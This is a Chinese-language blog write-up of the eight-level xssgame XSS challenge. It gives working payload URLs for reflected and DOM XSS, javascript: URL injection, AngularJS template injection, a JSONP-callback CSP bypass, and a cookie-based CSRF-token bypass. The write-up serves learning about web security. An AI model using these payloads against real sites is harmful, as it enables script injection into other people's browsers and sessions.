---
title: xssgame writeup
date: 2017-07-23 17:26:41
tags:
- xss
---


前段时间无意中玩了玩xssgame，应该是最新的xss挑战了吧，最近才有空整理了一下writeup，网上很多搜到的wp说的都不清楚，这里推荐一片wp。

[xssgame](http://www.xssgame.com)(需要翻墙)
[推荐的wp](https://www.shielder.it/blog/xssgame-google-hitb2017ams-writeup/)

<!--more-->

# level 1 #

第一题没什么特别的，查询输入没做任何过滤就输出了，所以直接插入标签就好了。

```
http://www.xssgame.com/f/m4KKGHi2rVUN/?query=1<img src="/" onerror=alert(1)>
```

# level 2 #

第二题其实有一点儿特别，dom xss，最关键的部分，其实就是如何让语句合理，因为在js的解析器中，js语句是按顺序解释的，如果碰到语法错误，就会停止解析，所以保证前后闭合就好了，这里分号换行都可以。

![image.png-37.5kB][1]

```
http://www.xssgame.com/f/WrfpuKFX8GNr/?timer=1')%0dalert('1
```

# level 3 #

同样是dom xss，在xss的时候，可以多考虑一下多输出点，可能很多地方都是有严格过滤的，但是很多时候还会出现多个输出点，这里就是这个问题，这里会读取url拼接入img的链接中，双引号截取，就可以插入标签了。

这是个垃圾payload，firefox获取location.hash自动过一次urlencode，无法绕过，坑了我一早上。

![image.png-62.8kB][2]

```
http://www.xssgame.com/f/u0hrDTsXmyVJ/#1'onerror=alert(1)>
```

# level 4 #

在confirm页面，会有一个js的跳转，这里会获取请求中的next参数拼接进入js语句，这里的问题和第二关类似，首先是js解析顺序问题，如果想要闭合解决的话，我们会发现，如果跳转这步js没问题，就会跳到新页面，就不能执行`alert(1)`了，所以这里只能通过js伪协议来执行alert。

![image.png-90.3kB][3]

```
http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:alert(1)
```

# level 5 #

题目是angularjs的，这里是最近几年比较流行的一种新前端问题，angularjs是典型的模板渲染的js解析方式，那么就有了新的问题，模板注入，可以通过模板注入的方式执行我们想要的js。

这里有个angular js的语法问题，最后是问了@math1as师傅我才搞明白。在angular js中ng-non-bindable这个属性，就相当于html标签中的pre标签，在这里面的所有属性都不会解析。

![image.png-41kB][4]

```
http://www.xssgame.com/f/JFTG_t7t3N-P/?utm_campaign={{$eval(%27alert(1)%27)}}
```

![image.png-67.2kB][5]


# level 6 #

模板注入和别的不同，需要通过angularjs的渲染，所以html实体编码仍然可以

```
http://www.xssgame.com/f/rWKWwJGnAeyi/?query=123%26lcub%3B%26lcub%3B%24eval%28%27alert%281%29%27%29%7D%7D
```

# level 7 #

这里也是一个去年到今年才刚刚被提出来的新问题，jsonp的callback导致的csp bypass问题。

题目中的CSP是这样的：
```
Content-Security-Policy	
default-src http://www.xssgame.com/f/wmOM2q5NJnZS/ http://www.xssgame.com/static/
```

当我们传入menu的时候，js会解base64，并且引入script标签，解析返回后放入页面内，但jsonp还有个callback参数，简单来说呢，就是在请求数据的同时，获取需要执行的函数名，但是通常这个地方并没有做任何处理，如果我们构造形似

```
alert(1);//xxxxxxxxxxxxxxxxxxxxxxxxxx
```

就可以执行我们需要的js

![image.png-43.6kB][6]

```
http://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PHNjcmlwdCBzcmM9Impzb25wP2NhbGxiYWNrPWFsZXJ0KDEpJTNCJTJmJTJmIj48L3NjcmlwdD4=
```

# level 8 #

题目本身还是bypass csp
```
Content-Security-Policy	
default-src http://www.xssgame.com/f/d9u16LTxchEi/ http://www.xssgame.com/static/
```

题目条件有点儿多，我们来慢慢研究。
1、第一个功能是设置name，但是仔细观察不难发现，设置的name是放在cookie里的，而且还接受了redirect参数，会在设置完跳到相应的位置。
2、第二个功能是设置参数，虽然我没搞明白具体是干了啥，但是amount这个参数只接受整数，如果传入不是整数，那么就会报错，并返回输入的内容，这个部分存在xss。
3、第二个功能还有一个问题是csrf_token，我们需要绕过这个东西，可以发现csrf_koen是存在cookie中的。

ok，那么我们把上面3个条件连起来就好了，我们通过set功能，设置csrf_token的cookie，然后通过redirect跳到transfer，就构成了一个完整的xss了。


```
http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&value=1&redirect=transfer%3Fname%3Dattacker%26amount%3D123%22%3E%3Cscript%3Ealert%281%29%3C%2fscript%3E%26csrf_token%3D1
```

  [1]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/dpj1h0g7nu7fl7oqa182zp5j/image.png
  [2]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/tqxu94dqc6jsacpvh64313cx/image.png
  [3]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/g2bfyw3barnj4hue3lg5kzg9/image.png
  [4]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/w4r2qa2evfhgm72p5umgugs4/image.png
  [5]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/yxpfbnis9jidy9w8lpmk96mz/image.png
  [6]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/g6eiv8nlvv1e47ehmwckq6pg/image.png